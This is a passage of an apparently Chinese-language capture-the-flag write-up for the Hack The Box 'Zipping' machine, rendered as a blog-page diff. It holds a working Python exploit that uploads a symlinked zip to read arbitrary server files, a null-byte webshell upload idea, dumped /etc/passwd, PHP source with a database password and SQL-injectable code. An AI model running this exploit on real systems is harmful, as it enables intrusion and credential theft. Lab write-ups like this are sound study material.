+
+&lt;/div&gt;&lt;!-- End of Container--&gt;      
+&lt;/section&gt;&lt;!-- End of Contact Section --&gt;
+&lt;!-- Section --&gt;
+&lt;section class=&quot;pb-0&quot;&gt;
+&lt;!-- Container --&gt;
+&lt;div class=&quot;container&quot;&gt;
+&lt;!-- Pre footer --&gt;
+&lt;div class=&quot;pre-footer&quot;&gt;
+&lt;ul class=&quot;list&quot;&gt;
+&lt;li class=&quot;list-head&quot;&gt;
+&lt;h6 class=&quot;font-weight-bold&quot;&gt;ABOUT US&lt;/h6&gt;
+&lt;/li&gt;
+&lt;li class=&quot;list-body&quot;&gt;
+&lt;p&gt;Zipping Co. is a company that is dedicated to producing high-quality watches that are both stylish and functional. We are constantly pushing the boundaries of what is possible with watch design and are known for their commitment to innovation and customer service.&lt;/p&gt;  
+&lt;a href=&quot;#&quot;&gt;&lt;strong class=&quot;text-primary&quot;&gt;Zipping&lt;/strong&gt; &lt;span class=&quot;text-dark&quot;&gt;Watch Store&lt;/span&gt;&lt;/a&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul class=&quot;list&quot;&gt;
+&lt;li class=&quot;list-head&quot;&gt;
+&lt;h6 class=&quot;font-weight-bold&quot;&gt;USEFUL LINKS&lt;/h6&gt;
+&lt;/li&gt;
+&lt;li class=&quot;list-body&quot;&gt;
+&lt;div class=&quot;row&quot;&gt;
+&lt;div class=&quot;col&quot;&gt;
+&lt;a href=&quot;#&quot;&gt;Link 1&lt;/a&gt;
+&lt;a href=&quot;#&quot;&gt;Link 2&lt;/a&gt;
+&lt;a href=&quot;#&quot;&gt;Link 3&lt;/a&gt;
+&lt;a href=&quot;#&quot;&gt;Link 4&lt;/a&gt;
+&lt;/div&gt;
+&lt;div class=&quot;col&quot;&gt;
+&lt;a href=&quot;#&quot;&gt;Link 5&lt;/a&gt;
+&lt;a href=&quot;#&quot;&gt;Link 6&lt;/a&gt;
+&lt;a href=&quot;#&quot;&gt;Link 7&lt;/a&gt;
+&lt;a href=&quot;#&quot;&gt;Link 8&lt;/a&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul class=&quot;list&quot;&gt;
+&lt;li class=&quot;list-head&quot;&gt;
+&lt;h6 class=&quot;font-weight-bold&quot;&gt;CONTACT INFO&lt;/h6&gt;
+&lt;/li&gt;
+&lt;li class=&quot;list-body&quot;&gt;
+&lt;p&gt;Contact us and we&#39;ll get back to you within 24 hours.&lt;/p&gt;
+&lt;p&gt;&lt;i class=&quot;ti-location-pin&quot;&gt;&lt;/i&gt; 12345 Fake ST NoWhere AB Country&lt;/p&gt;
+&lt;p&gt;&lt;i class=&quot;ti-email&quot;&gt;&lt;/i&gt;  info@website.com&lt;/p&gt;
+&lt;div class=&quot;social-links&quot;&gt;
+&lt;a href=&quot;javascript:void(0)&quot; class=&quot;link&quot;&gt;&lt;i class=&quot;ti-facebook&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+&lt;a href=&quot;javascript:void(0)&quot; class=&quot;link&quot;&gt;&lt;i class=&quot;ti-twitter-alt&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+&lt;a href=&quot;javascript:void(0)&quot; class=&quot;link&quot;&gt;&lt;i class=&quot;ti-google&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+&lt;a href=&quot;javascript:void(0)&quot; class=&quot;link&quot;&gt;&lt;i class=&quot;ti-pinterest-alt&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+&lt;a href=&quot;javascript:void(0)&quot; class=&quot;link&quot;&gt;&lt;i class=&quot;ti-instagram&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+&lt;a href=&quot;javascript:void(0)&quot; class=&quot;link&quot;&gt;&lt;i class=&quot;ti-rss&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;/ul&gt; 
+&lt;/div&gt;&lt;!-- End of Pre footer --&gt;            
+
+&lt;!-- foooter --&gt;
+&lt;footer class=&quot;footer&quot;&gt;
+&lt;p&gt;Made by &lt;a href=&quot;https://github.com/xdann1&quot;&gt;xDaNN1&lt;/p&gt;
+&lt;/footer&gt;&lt;!-- End of Footer--&gt;  
+
+&lt;/div&gt;&lt;!--End of Container --&gt;      
+&lt;/section&gt;&lt;!-- End of Section --&gt;
+
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>简单审计过后，<code>if (pathinfo($fileName, PATHINFO_EXTENSION) === &quot;pdf&quot;) </code> 代码中是通过这个方式来获取文件后缀名的，如果我们尝试在文件名中使用<code>\x00</code>这样的符号来截断字符串，是不是有可能就有可能拿到webshell  ， 比如 shell.php\00.pdf </p>
+<p>尝试过后，发现并上传不了shell，后面有消息得知官方修复了这一条路径</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1694313034063-441a18b3-5973-44c2-bd02-0a778a7cdd52.png#averageHue=%23f6f7ef&clientId=ub0ae23b1-0055-4&from=paste&height=746&id=ufdd03f41&originHeight=839&originWidth=1898&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=191019&status=done&style=none&taskId=u5e1a9353-9a02-4547-8d32-8d28e8fe6c6&title=&width=1687.111111111111" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>左边为patch 前 </p>
+<h2 id="LFI-py"><a href="#LFI-py" class="headerlink" title="LFI.py"></a>LFI.py</h2><pre><code class="python">import os
+from bs4 import BeautifulSoup
+import requests
+import shutil
+if os.path.exists(&quot;tmp&quot;):
+    shutil.rmtree(&quot;tmp&quot;)
+if os.path.exists(&quot;sym.zip&quot;):
+    os.remove(&quot;sym.zip&quot;)
+if os.path.exists(&quot;symlink.pdf&quot;):
+    os.remove(&quot;symlink.pdf&quot;)
+if not os.path.exists(&quot;tmp&quot;):
+            os.mkdir(&quot;tmp&quot;)
+file_to_read = input(&quot;File to read: &quot;)
+print(&quot;Creating symlink..&quot;)
+os.chdir(&quot;tmp/&quot;)
+os.system(f&quot;ln -s {file_to_read} symlink.pdf&quot;)
+print(&quot;Zipping..&quot;)
+os.system(f&quot;zip -r --symlinks sym.zip symlink.pdf&quot;)
+os.system(f&quot;rm symlink.pdf &amp;&amp; cp sym.zip ../&quot;)
+print(&quot;Done! Zip file: sym.zip&quot;)
+
+print(&quot;Uploading file..&quot;)
+MIP = &quot;10.10.11.229&quot;
+file = {&#39;zipFile&#39;: (&#39;sym.zip&#39;, open(&#39;sym.zip&#39;,&#39;rb&#39;),&#39;application/zip&#39;),
+        &#39;submit&#39;: (None,&#39;&#39;)         
+       }
+headers = {&quot;Host&quot;:MIP,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (X11;Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;}
+s  = requests.Session()
+r = s.get(f&quot;http://{MIP}&quot;,headers=headers)
+r = s.get(f&quot;http://{MIP}/upload.php&quot;, headers=headers)
+r = s.post(f&quot;http://{MIP}/upload.php&quot;,files=file,headers=headers)
+
+soup = BeautifulSoup(r.text,features=&quot;lxml&quot;)
+
+uuid=&quot;&quot;
+for a in soup.find_all(&quot;a&quot;,href=True):
+            if &quot;uploads&quot; in a[&#39;href&#39;]:
+                                uuid = a[&#39;href&#39;].split(&quot;/&quot;)[1]
+                                print(&quot;File UUID: &quot;,uuid)
+                                print(&quot;\nReading file..&quot;)
+                                r = s.get(f&quot;http://{MIP}/uploads/{uuid}/symlink.pdf&quot;)
+                                print(r.text)
+</code></pre>
+<pre><code class="python">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# python3 exp.py
+File to read: /etc/passwd
+Creating symlink..
+Zipping..
+  adding: symlink.pdf (stored 0%)
+Done! Zip file: sym.zip
+Uploading file..
+File UUID:  f5439a569446382315e4b406a7633fa5
+
+Reading file..
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+rektsu:x:1001:1001::/home/rektsu:/bin/bash
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
+_laurel:x:999:999::/var/log/laurel:/bin/false
+
+</code></pre>
+<p>通过这个脚本，可以很方便的读取文件 </p>
+<pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# python3 exp.py
+File to read: /var/www/html/shop/index.php
+Creating symlink..
+Zipping..
+  adding: symlink.pdf (stored 0%)
+Done! Zip file: sym.zip
+Uploading file..
+File UUID:  0fceede2a1f56ec8d41c2f5815af39c8
+
+Reading file..
+&lt;?php
+session_start();
+// Include functions and connect to the database using PDO MySQL
+include &#39;functions.php&#39;;
+$pdo = pdo_connect_mysql();
+// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
+$page = isset($_GET[&#39;page&#39;]) &amp;&amp; file_exists($_GET[&#39;page&#39;] . &#39;.php&#39;) ? $_GET[&#39;page&#39;] : &#39;home&#39;;
+// Include and show the requested page
+include $page . &#39;.php&#39;;
+?&gt;
+
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# python3 exp.py
+File to read: /var/www/html/shop/functions.php
+Creating symlink..
+Zipping..
+  adding: symlink.pdf (stored 0%)
+Done! Zip file: sym.zip
+Uploading file..
+File UUID:  1c9a1c578b7600c96139f25f0e072db2
+
+Reading file..
+&lt;?php
+function pdo_connect_mysql() {
+    // Update the details below with your MySQL details
+    $DATABASE_HOST = &#39;localhost&#39;;
+    $DATABASE_USER = &#39;root&#39;;
+    $DATABASE_PASS = &#39;MySQL_P@ssw0rd!&#39;;
+    $DATABASE_NAME = &#39;zipping&#39;;
+    try {
+        return new PDO(&#39;mysql:host=&#39; . $DATABASE_HOST . &#39;;dbname=&#39; . $DATABASE_NAME . &#39;;charset=utf8&#39;, $DATABASE_USER, $DATABASE_PASS);
+    } catch (PDOException $exception) {
+        // If there is an error with the connection, stop the script and display the error.
+        exit(&#39;Failed to connect to database!&#39;);
+    }
+}
+// Template header, feel free to customize this
+function template_header($title) {
+$num_items_in_cart = isset($_SESSION[&#39;cart&#39;]) ? count($_SESSION[&#39;cart&#39;]) : 0;
+echo &lt;&lt;&lt;EOT
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+        &lt;head&gt;
+                &lt;meta charset=&quot;utf-8&quot;&gt;
+                &lt;title&gt;$title&lt;/title&gt;
+                &lt;link href=&quot;assets/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;
+                &lt;link rel=&quot;stylesheet&quot; href=&quot;https://use.fontawesome.com/releases/v5.7.1/css/all.css&quot;&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+        &lt;header&gt;
+            &lt;div class=&quot;content-wrapper&quot;&gt;
+                &lt;a href=&quot;..&quot; style=&quot;text-decoration: none;&quot;&gt;&lt;h1&gt;Zipping Watch Store&lt;/h1&gt;&lt;/a&gt;
+                &lt;nav&gt;
+                    &lt;a href=&quot;index.php&quot;&gt;Home&lt;/a&gt;
+                    &lt;a href=&quot;index.php?page=products&quot;&gt;Products&lt;/a&gt;
+                &lt;/nav&gt;
+                &lt;div class=&quot;link-icons&quot;&gt;
+                    &lt;a href=&quot;index.php?page=cart&quot;&gt;
+                                                &lt;i class=&quot;fas fa-shopping-cart&quot;&gt;&lt;/i&gt;
+                                                &lt;span&gt;$num_items_in_cart&lt;/span&gt;
+                                        &lt;/a&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/header&gt;
+        &lt;main&gt;
+EOT;
+}
+// Template footer
+function template_footer() {
+$year = date(&#39;Y&#39;);
+echo &lt;&lt;&lt;EOT
+        &lt;/main&gt;
+        &lt;footer&gt;
+            &lt;div class=&quot;content-wrapper&quot;&gt;
+                &lt;p&gt;&amp;copy; $year, Zipping Watch Store&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/footer&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+EOT;
+}
+?&gt;
+</code></pre>
+<pre><code class="php">&lt;?php
+  session_start();
+// Include functions and connect to the database using PDO MySQL
+include &#39;functions.php&#39;;
+$pdo = pdo_connect_mysql();
+// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
+$page = isset($_GET[&#39;page&#39;]) &amp;&amp; file_exists($_GET[&#39;page&#39;] . &#39;.php&#39;) ? $_GET[&#39;page&#39;] : &#39;home&#39;;
+// Include and show the requested page
+include $page . &#39;.php&#39;;
+?&gt;
+</code></pre>
+<pre><code class="php">&lt;?php
+function pdo_connect_mysql() {
+    // Update the details below with your MySQL details
+    $DATABASE_HOST = &#39;localhost&#39;;
+    $DATABASE_USER = &#39;root&#39;;
+    $DATABASE_PASS = &#39;MySQL_P@ssw0rd!&#39;;
+    $DATABASE_NAME = &#39;zipping&#39;;
+    try {
+        return new PDO(&#39;mysql:host=&#39; . $DATABASE_HOST . &#39;;dbname=&#39; . $DATABASE_NAME . &#39;;charset=utf8&#39;, $DATABASE_USER, $DATABASE_PASS);
+    } catch (PDOException $exception) {
+        // If there is an error with the connection, stop the script and display the error.
+        exit(&#39;Failed to connect to database!&#39;);
+    }
+}
+// Template header, feel free to customize this
+function template_header($title) {
+$num_items_in_cart = isset($_SESSION[&#39;cart&#39;]) ? count($_SESSION[&#39;cart&#39;]) : 0;
+echo &lt;&lt;&lt;EOT
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+        &lt;head&gt;
+                &lt;meta charset=&quot;utf-8&quot;&gt;
+                &lt;title&gt;$title&lt;/title&gt;
+                &lt;link href=&quot;assets/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;
+                &lt;link rel=&quot;stylesheet&quot; href=&quot;https://use.fontawesome.com/releases/v5.7.1/css/all.css&quot;&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+        &lt;header&gt;
+            &lt;div class=&quot;content-wrapper&quot;&gt;
+                &lt;a href=&quot;..&quot; style=&quot;text-decoration: none;&quot;&gt;&lt;h1&gt;Zipping Watch Store&lt;/h1&gt;&lt;/a&gt;
+                &lt;nav&gt;
+                    &lt;a href=&quot;index.php&quot;&gt;Home&lt;/a&gt;
+                    &lt;a href=&quot;index.php?page=products&quot;&gt;Products&lt;/a&gt;
+                &lt;/nav&gt;
+                &lt;div class=&quot;link-icons&quot;&gt;
+                    &lt;a href=&quot;index.php?page=cart&quot;&gt;
+                                                &lt;i class=&quot;fas fa-shopping-cart&quot;&gt;&lt;/i&gt;
+                                                &lt;span&gt;$num_items_in_cart&lt;/span&gt;
+                                        &lt;/a&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/header&gt;
+        &lt;main&gt;
+EOT;
+}
+// Template footer
+function template_footer() {
+$year = date(&#39;Y&#39;);
+echo &lt;&lt;&lt;EOT
+        &lt;/main&gt;
+        &lt;footer&gt;
+            &lt;div class=&quot;content-wrapper&quot;&gt;
+                &lt;p&gt;&amp;copy; $year, Zipping Watch Store&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/footer&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+EOT;
+}
+?&gt;
+</code></pre>
+<pre><code class="php">&lt;?php
+// Check to make sure the id parameter is specified in the URL
+if (isset($_GET[&#39;id&#39;])) {
+    $id = $_GET[&#39;id&#39;];
+    // Filtering user input for letters or special characters
+    if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+{}\[\]\\|;:&#39;\&quot;,.&lt;&gt;\/?]|[^0-9]$/&quot;, $id, $match)) {
+        header(&#39;Location: index.php&#39;);
+    } else {
+        // Prepare statement and execute, but does not prevent SQL injection
+        $stmt = $pdo-&gt;prepare(&quot;SELECT * FROM products WHERE id = &#39;$id&#39;&quot;);
+        $stmt-&gt;execute();
+        // Fetch the product from the database and return the result as an Array
+        $product = $stmt-&gt;fetch(PDO::FETCH_ASSOC);
+        // Check if the product exists (array is not empty)
+        if (!$product) {
+            // Simple error to display if the id for the product doesn&#39;t exists (array is empty)
+            exit(&#39;Product does not exist!&#39;);
+        }
+    }
+} else {
+    // Simple error to display if the id wasn&#39;t specified
+    exit(&#39;No ID provided!&#39;);
+}
+?&gt;
+
+&lt;?=template_header(&#39;Zipping | Product&#39;)?&gt;
+
+&lt;div class=&quot;product content-wrapper&quot;&gt;
+    &lt;img src=&quot;assets/imgs/&lt;?=$product[&#39;img&#39;]?&gt;&quot; width=&quot;500&quot; height=&quot;500&quot; alt=&quot;&lt;?=$product[&#39;name&#39;]?&gt;&quot;&gt;
+    &lt;div&gt;
+        &lt;h1 class=&quot;name&quot;&gt;&lt;?=$product[&#39;name&#39;]?&gt;&lt;/h1&gt;
+        &lt;span class=&quot;price&quot;&gt;
+            &amp;dollar;&lt;?=$product[&#39;price&#39;]?&gt;
+            &lt;?php if ($product[&#39;rrp&#39;] &gt; 0): ?&gt;
+            &lt;span class=&quot;rrp&quot;&gt;&amp;dollar;&lt;?=$product[&#39;rrp&#39;]?&gt;&lt;/span&gt;
+            &lt;?php endif; ?&gt;
+        &lt;/span&gt;
+        &lt;form action=&quot;index.php?page=cart&quot; method=&quot;post&quot;&gt;
+            &lt;input type=&quot;number&quot; name=&quot;quantity&quot; value=&quot;1&quot; min=&quot;1&quot; max=&quot;&lt;?=$product[&#39;quantity&#39;]?&gt;&quot; placeholder=&quot;Quantity&quot; required&gt;
+            &lt;input type=&quot;hidden&quot; name=&quot;product_id&quot; value=&quot;&lt;?=$product[&#39;id&#39;]?&gt;&quot;&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;Add To Cart&quot;&gt;
+        &lt;/form&gt;
+        &lt;div class=&quot;description&quot;&gt;
+            &lt;?=$product[&#39;desc&#39;]?&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;?=template_footer()?&gt;
+</code></pre>
+<pre><code class="php">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# python3 exp.py
+File to read: /var/www/html/shop/cart.php
+Creating symlink..
+Zipping..
+  adding: symlink.pdf (stored 0%)
+Done! Zip file: sym.zip
+Uploading file..
+File UUID:  08347a0de79cdb3465a4def4d2b264cd
+
+Reading file..
+&lt;?php
+// If the user clicked the add to cart button on the product page we can check for the form data
+if (isset($_POST[&#39;product_id&#39;], $_POST[&#39;quantity&#39;])) {
+    // Set the post variables so we easily identify them, also make sure they are integer
+    $product_id = $_POST[&#39;product_id&#39;];
+    $quantity = $_POST[&#39;quantity&#39;];
+    // Filtering user input for letters or special characters
+    if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+{}\[\]\\|;:&#39;\&quot;,.&lt;&gt;\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+{}[\]\\|;:&#39;\&quot;,.&lt;&gt;\/?]/i&quot;, $quantity, $match)) {
+        echo &#39;&#39;;
+    } else {
+        // Construct the SQL statement with a vulnerable parameter
+        $sql = &quot;SELECT * FROM products WHERE id = &#39;&quot; . $_POST[&#39;product_id&#39;] . &quot;&#39;&quot;;
+        // Execute the SQL statement without any sanitization or parameter binding
+        $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);
+        // Check if the product exists (array is not empty)
+        if ($product &amp;&amp; $quantity &gt; 0) {
+            // Product exists in database, now we can create/update the session variable for the cart
+            if (isset($_SESSION[&#39;cart&#39;]) &amp;&amp; is_array($_SESSION[&#39;cart&#39;])) {
+                if (array_key_exists($product_id, $_SESSION[&#39;cart&#39;])) {
+                    // Product exists in cart so just update the quanity
+                    $_SESSION[&#39;cart&#39;][$product_id] += $quantity;
+                } else {
+                    // Product is not in cart so add it
+                    $_SESSION[&#39;cart&#39;][$product_id] = $quantity;
+                }
+            } else {
+                // There are no products in cart, this will add the first product to cart
+                $_SESSION[&#39;cart&#39;] = array($product_id =&gt; $quantity);
+            }
+        }
+        // Prevent form resubmission...
+        header(&#39;location: index.php?page=cart&#39;);
+        exit;
+    }
+}
+
+// Remove product from cart, check for the URL param &quot;remove&quot;, this is the product id, make sure it&#39;s a number and check if it&#39;s in the cart
+if (isset($_GET[&#39;remove&#39;]) &amp;&amp; is_numeric($_GET[&#39;remove&#39;]) &amp;&amp; isset($_SESSION[&#39;cart&#39;]) &amp;&amp; isset($_SESSION[&#39;cart&#39;][$_GET[&#39;remove&#39;]])) {
+
+    // Remove the product from the shopping cart
+    unset($_SESSION[&#39;cart&#39;][$_GET[&#39;remove&#39;]]);
+}
+
+// Update product quantities in cart if the user clicks the &quot;Update&quot; button on the shopping cart page
+if (isset($_POST[&#39;update&#39;]) &amp;&amp; isset($_SESSION[&#39;cart&#39;])) {
+    // Loop through the post data so we can update the quantities for every product in cart
+    foreach ($_POST as $k =&gt; $v) {
+        if (strpos($k, &#39;quantity&#39;) !== false &amp;&amp; is_numeric($v)) {
+            $id = str_replace(&#39;quantity-&#39;, &#39;&#39;, $k);
+            $quantity = (int)$v;
+            // Always do checks and validation
+            if (is_numeric($id) &amp;&amp; isset($_SESSION[&#39;cart&#39;][$id]) &amp;&amp; $quantity &gt; 0) {
+                // Update new quantity
+                $_SESSION[&#39;cart&#39;][$id] = $quantity;
+            }
+        }
+    }
+    // Prevent form resubmission...
+    header(&#39;location: index.php?page=cart&#39;);
+    exit;
+}
+
+// Send the user to the place order page if they click the Place Order button, also the cart should not be empty
+if (isset($_POST[&#39;placeorder&#39;]) &amp;&amp; isset($_SESSION[&#39;cart&#39;]) &amp;&amp; !empty($_SESSION[&#39;cart&#39;])) {
+    header(&#39;Location: index.php?page=placeorder&#39;);
+    exit;
+}
+
+if (isset($_POST[&#39;clear&#39;])) {
+        unset($_SESSION[&#39;cart&#39;]);
+}
+
+// Check the session variable for products in cart
+$products_in_cart = isset($_SESSION[&#39;cart&#39;]) ? $_SESSION[&#39;cart&#39;] : array();
+$products = array();
+$subtotal = 0.00;
+// If there are products in cart
+if ($products_in_cart) {
+    // There are products in the cart so we need to select those products from the database
+    // Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc)
+    $array_to_question_marks = implode(&#39;,&#39;, array_fill(0, count($products_in_cart), &#39;?&#39;));
+    $stmt = $pdo-&gt;prepare(&#39;SELECT * FROM products WHERE id IN (&#39; . $array_to_question_marks . &#39;)&#39;);
+    // We only need the array keys, not the values, the keys are the id&#39;s of the products
+    $stmt-&gt;execute(array_keys($products_in_cart));
+    // Fetch the products from the database and return the result as an Array
+    $products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
+    // Calculate the subtotal
+    foreach ($products as $product) {
+        $subtotal += (float)$product[&#39;price&#39;] * (int)$products_in_cart[$product[&#39;id&#39;]];
+    }
+}
+?&gt;
+
+&lt;?=template_header(&#39;Zipping | Cart&#39;)?&gt;
+
+&lt;div class=&quot;cart content-wrapper&quot;&gt;
+    &lt;h1&gt;Shopping Cart&lt;/h1&gt;
+    &lt;form action=&quot;index.php?page=cart&quot; method=&quot;post&quot;&gt;
+        &lt;table&gt;
+            &lt;thead&gt;
+                &lt;tr&gt;
+                    &lt;td colspan=&quot;2&quot;&gt;Product&lt;/td&gt;
+                    &lt;td&gt;Price&lt;/td&gt;
+                    &lt;td&gt;Quantity&lt;/td&gt;
+                    &lt;td&gt;Total&lt;/td&gt;
+                &lt;/tr&gt;
+            &lt;/thead&gt;
+            &lt;tbody&gt;
+                &lt;?php if (empty($products)): ?&gt;
+                &lt;tr&gt;
+                    &lt;td colspan=&quot;5&quot; style=&quot;text-align:center;&quot;&gt;You have no products added in your Shopping Cart&lt;/td&gt;
+                &lt;/tr&gt;
+                &lt;?php else: ?&gt;
+                &lt;?php foreach ($products as $product): ?&gt;
+                &lt;tr&gt;
+                    &lt;td class=&quot;img&quot;&gt;
+                        &lt;a href=&quot;index.php?page=product&amp;id=&lt;?=$product[&#39;id&#39;]?&gt;&quot;&gt;
+                            &lt;img src=&quot;assets/imgs/&lt;?=$product[&#39;img&#39;]?&gt;&quot; width=&quot;50&quot; height=&quot;50&quot; alt=&quot;&lt;?=$product[&#39;name&#39;]?&gt;&quot;&gt;
+                        &lt;/a&gt;
+                    &lt;/td&gt;
+                    &lt;td&gt;
+                        &lt;a href=&quot;index.php?page=product&amp;id=&lt;?=$product[&#39;id&#39;]?&gt;&quot;&gt;&lt;?=$product[&#39;name&#39;]?&gt;&lt;/a&gt;
+                        &lt;br&gt;
+                        &lt;a href=&quot;index.php?page=cart&amp;remove=&lt;?=$product[&#39;id&#39;]?&gt;&quot; class=&quot;remove&quot;&gt;Remove&lt;/a&gt;
+                    &lt;/td&gt;
+                    &lt;td class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$product[&#39;price&#39;]?&gt;&lt;/td&gt;
+                    &lt;td class=&quot;quantity&quot;&gt;
+                        &lt;input type=&quot;number&quot; name=&quot;quantity-&lt;?=$product[&#39;id&#39;]?&gt;&quot; value=&quot;&lt;?=$products_in_cart[$product[&#39;id&#39;]]?&gt;&quot; min=&quot;1&quot; max=&quot;&lt;?=$product[&#39;quantity&#39;]?&gt;&quot; placeholder=&quot;Quantity&quot; required&gt;
+                    &lt;/td&gt;
+                    &lt;td class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$product[&#39;price&#39;] * $products_in_cart[$product[&#39;id&#39;]]?&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+                &lt;?php endforeach; ?&gt;
+                &lt;?php endif; ?&gt;
+            &lt;/tbody&gt;
+        &lt;/table&gt;
+        &lt;div class=&quot;subtotal&quot;&gt;
+            &lt;span class=&quot;text&quot;&gt;Subtotal&lt;/span&gt;
+            &lt;span class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$subtotal?&gt;&lt;/span&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;buttons&quot;&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;Update&quot; name=&quot;update&quot;&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;Place Order&quot; name=&quot;placeorder&quot;&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;Clear&quot; name=&quot;clear&quot; onsubmit=&quot;&quot;&gt;
+        &lt;/div&gt;
+    &lt;/form&gt;
+&lt;/div&gt;
+
+&lt;?=template_footer()?&gt;
+
+</code></pre>
+<pre><code class="php">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Zipping]
+└─# python3 exp.py
+File to read: /var/www/html/shop/home.php
+Creating symlink..
+Zipping..
+  adding: symlink.pdf (stored 0%)
+Done! Zip file: sym.zip
+Uploading file..
+File UUID:  dbf17dfb996eb5d0e96c45a4947877d4
+
+Reading file..
+&lt;?php
+// Get the 4 most recently added products
+$stmt = $pdo-&gt;prepare(&#39;SELECT * FROM products ORDER BY date_added DESC LIMIT 4&#39;);
+$stmt-&gt;execute();
+$recently_added_products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
+?&gt;
+&lt;?=template_header(&#39;Zipping | Home&#39;)?&gt;
+
+&lt;div class=&quot;featured&quot;&gt;
+    &lt;h2&gt;Watches&lt;/h2&gt;
+    &lt;p&gt;The perfect watch for every occasion&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&quot;recentlyadded content-wrapper&quot;&gt;
+    &lt;h2&gt;Recently Added Products&lt;/h2&gt;
+    &lt;div class=&quot;products&quot;&gt;
+        &lt;?php foreach ($recently_added_products as $product): ?&gt;
+        &lt;a href=&quot;index.php?page=product&amp;id=&lt;?=$product[&#39;id&#39;]?&gt;&quot; class=&quot;product&quot;&gt;
+            &lt;img src=&quot;assets/imgs/&lt;?=$product[&#39;img&#39;]?&gt;&quot; width=&quot;200&quot; height=&quot;200&quot; alt=&quot;&lt;?=$product[&#39;name&#39;]?&gt;&quot;&gt;
+            &lt;span class=&quot;name&quot;&gt;&lt;?=$product[&#39;name&#39;]?&gt;&lt;/span&gt;
+            &lt;span class=&quot;price&quot;&gt;
+                &amp;dollar;&lt;?=$product[&#39;price&#39;]?&gt;
+                &lt;?php if ($product[&#39;rrp&#39;] &gt; 0): ?&gt;
+                &lt;span class=&quot;rrp&quot;&gt;&amp;dollar;&lt;?=$product[&#39;rrp&#39;]?&gt;&lt;/span&gt;
